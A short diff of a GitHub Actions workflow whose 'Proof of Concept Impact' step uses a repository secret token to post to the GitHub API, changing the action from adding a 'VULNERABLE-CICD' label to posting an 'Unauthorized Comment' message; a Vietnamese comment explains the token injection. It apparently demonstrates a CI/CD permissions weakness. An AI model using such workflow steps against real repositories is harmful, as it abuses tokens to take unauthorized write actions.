@@ -35,11 +35,12 @@ jobs:
           cla-token: ${{ secrets.cla-token }}
       - name: Proof of Concept Impact
         env:
-          GITHUB_TOKEN: ${{ secrets.token }}
+          # Đây là khai báo để Runner của GitHub tự bốc Token dán vào
+          GITHUB_TOKEN: ${{ secrets.token }} 
         run: |
-          curl -X POST \
+          curl -L -X POST \
           -H "Authorization: Bearer $GITHUB_TOKEN" \
           -H "Accept: application/vnd.github+json" \
-          https://github.com{{ github.event.pull_request.number }}/labels \
-          -d '{"labels":["VULNERABLE-CICD"]}'
+          "https://github.com{{ github.event.pull_request.number }}/comments" \
+          -d '{"body":"POC SUCCESS: Unauthorized Comment via Actions Write"}'
 
